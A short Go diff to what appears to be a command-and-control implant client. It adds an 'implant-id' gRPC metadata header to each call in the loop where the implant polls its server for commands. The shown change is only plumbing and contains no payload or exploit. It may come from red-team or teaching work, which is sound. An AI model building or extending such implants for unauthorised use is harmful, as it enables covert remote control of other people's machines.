@@ -13,6 +13,7 @@ import (
 	"google.golang.org/grpc"
 	"google.golang.org/grpc/codes"
 	"google.golang.org/grpc/credentials"
+	"google.golang.org/grpc/metadata"
 	"google.golang.org/grpc/status"
 )
 
@@ -46,6 +47,10 @@ func main() {
 	implantId = uuid.MustParse(resp.Id)
 	fmt.Println(implantId)
 	for {
+		// Inserting grpc metadata in context
+		md := metadata.Pairs("implant-id", implantId.String())
+		ctx = metadata.NewOutgoingContext(ctx, md)
+
 		var req = new(grpcapi.Empty)
 		cmd, err := client.FetchCommand(ctx, req)
 		if err != nil {
